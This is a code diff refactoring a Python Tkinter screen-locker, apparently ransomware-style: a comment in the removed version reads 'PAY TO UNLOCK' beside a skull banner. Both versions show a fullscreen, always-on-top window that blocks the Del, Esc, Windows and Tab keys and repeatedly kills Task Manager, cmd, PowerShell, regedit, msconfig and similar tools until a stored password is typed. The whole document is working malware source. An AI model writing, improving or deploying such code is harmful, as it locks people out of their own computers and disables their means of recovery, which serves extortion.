@@ -1,126 +1,63 @@
+import asyncio
 from tkinter import Tk, Entry, Label
-import psutil
-import keyboard
+from psutil import process_iter
+from keyboard import block_key
+from label import main_text, second_text
 
 
-Taskmgr = 'taskmgr.exe'
-cmd = 'cmd.exe'
-powershell = 'powershell.exe'
-powershell_ise = 'powershell_ise.exe'
-regedit = 'regedit.exe'
-mmc = 'mmc.exe'
-msconfig = 'msconfig.exe'
-ProcessHacker = 'ProcessHacker.exe'
-iexplore = 'iexplore.exe'
-game = 'game.exe'
+root = Tk()
 
 
-with open(r'C:\pas.txt', 'r') as pas: # В файл pas.txt пишем свой пароль
-    data = pas.read()
+class Locker:
 
-def callback(event):
-    global k,entry
-    if entry.get() == data:
-        k = True
+    def __init__(self):
+        self.block = False
+        with open(r'pas.txt', 'r') as pas:
+            self.data = pas.read()
+        root.title("007")
+        root.configure(background="#1c1c1c")
+        self.entry = Entry(root, show='⮚', font='Arial 15', fg="red")
+        self.entry.place(width=350, height=30, relx=0.4, rely=0.5, x=-30)
+        label_0 = Label(root, text=main_text, font='Arial 5', fg="red", background="#1c1c1c")
+        label_0.grid(row=0, column=0)
+        label_1 = Label(root, text=second_text, font='Arial 15', fg='red', background='#1c1c1c')
+        label_1.place(relx=0.4, rely=0.5, x=-20, y=40)
 
-def on_closing():
-    root.attributes("-fullscreen", True) # на весь экран
-    root.attributes('-topmost', 1) # поверх всех окон
-    root.protocol("WM_DELETE_WINDOW", on_closing)
-    root.update()
-    root.bind('<Alt-KeyPress-s>', callback) # Сочетание клавиш, вместо Enter (можно изменить)
+    async def close(self):
+        root.attributes("-fullscreen", True)
+        root.attributes('-topmost', 1)
+        root.protocol("WM_DELETE_WINDOW")
+        root.update()
+        root.bind('<Alt-KeyPress-s>', self.check_password)
 
-root = Tk() # Создание окна
-root.title("007") # PAY TO UNLOCK
-root.attributes("-fullscreen",True) # Расширение под экран
-root.configure(background="#1c1c1c")
-entry = Entry(root,show='➤',font='Arial 15', fg="red")# Поле ввода
-entry.place(width=350,height=30,x=500,y=400) # Координаты и размеры
-label0 = Label(root,text="\n\n\n\n\n\n\n\n\n\n
-                 uuuuuuu
-             uu$$$$$$$$$$$uu
-          uu$$$$$$$$$$$$$$$$$uu
-         u$$$$$$$$$$$$$$$$$$$$$u
-        u$$$$$$$$$$$$$$$$$$$$$$$u
-       u$$$$$$$$$$$$$$$$$$$$$$$$$u
-       u$$$$$$$$$$$$$$$$$$$$$$$$$u
-       u$$$$$$'   '$$$'   $$$$$$u'
-       '$$$$'      u$u       $$$$
-        $$$u       u$u       u$$$
-        $$$u      u$$$u      u$$$
-         '$$$$uu$$$   $$$uu$$$$'
-          '$$$$$$$'   '$$$$$$$'
-            u$$$$$$$u$$$$$$$u
-             u$'$'$'$'$'$'$u
-  uuu        $$u$ $ $ $ $u$$       uuu
- u$$$$        $$$$$u$u$u$$$       u$$$$
-  $$$$$uu      '$$$$$$$$$'     uu$$$$$$
-u$$$$$$$$$$$uu    '''''    uuuu$$$$$$$$$$
-$$$$'''$$$$$$$$$$uuu   uu$$$$$$$$$'''$$$'
- '''      ''$$$$$$$$$$$uu '''$'''
-           uuuu ''$$$$$$$$$$uuu
-  u$$$uuu$$$$$$$$$uu ''$$$$$$$$$$$uuu$$$
-  $$$$$$$$$$''''           ''$$$$$$$$$$$'
-   '$$$$$'                      ''$$$$''
-     $$$'                         $$$$''",font='Arial 5', fg="red", background="#1c1c1c") # Надпись 1
-label0.grid(row=0,column=0) # Координаты надписи 1
-label1 = Label(root,text="Write the Password and Press Enter",font='Broadway 20', fg="red", background="#1c1c1c") # Надпись 2
-label1.place(x=420,y=330) # Координаты надписи 2
+    def check_password(self, event):
+        if self.entry.get() == self.data:
+            self.block = True
 
-def block():
-    try:
-        keyboard.block_key('Del')
-        keyboard.block_key('Esc')
-        keyboard.block_key('Windows')
-        keyboard.block_key('Tab')
-    except:
-        return
+    async def block_button(self):
+        buttons = ['Del', 'Esc', 'Windows', 'Tab']
+        for button in buttons:
+            block_key(button)
 
-    try:
-        for proc in psutil.process_iter():
-            if proc.name() == game:
-                proc.kill()
+    async def block_process(self):
+        processing = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'powershell_ise.exe', 'regedit.exe', 'msconfig.exe',
+                      'ProcessHacker.exe', 'iexplore.exe', 'game.exe', 'SystemSettings.exe']
+        for process in process_iter():
+            if process.name() in processing:
+                process.kill()
 
-        for proc in psutil.process_iter():
-            if proc.name() == iexplore:
-                proc.kill()
+    async def main(self):
+        coro_list = [self.close(), self.block_button(), self.block_process()]
+        cors = []
+        for i in coro_list:
+            task = asyncio.create_task(i)
+            cors.append(task)
+            await asyncio.sleep(0.1)
 
-        for proc in psutil.process_iter():
-            if proc.name() == ProcessHacker:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == msconfig:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == mmc:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == regedit:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == Taskmgr:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == cmd:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == powershell:
-                proc.kill()
-
-        for proc in psutil.process_iter():
-            if proc.name() == powershell_ise:
-                proc.kill()
-    except:
-        return
+        await asyncio.gather(*cors, return_exceptions=True)
 
 
-k = False
-while k != True:
-    block()
-    on_closing()
+if __name__ == '__main__':
+    app = Locker()
+    while app.block is not True:
+        asyncio.run(app.main())
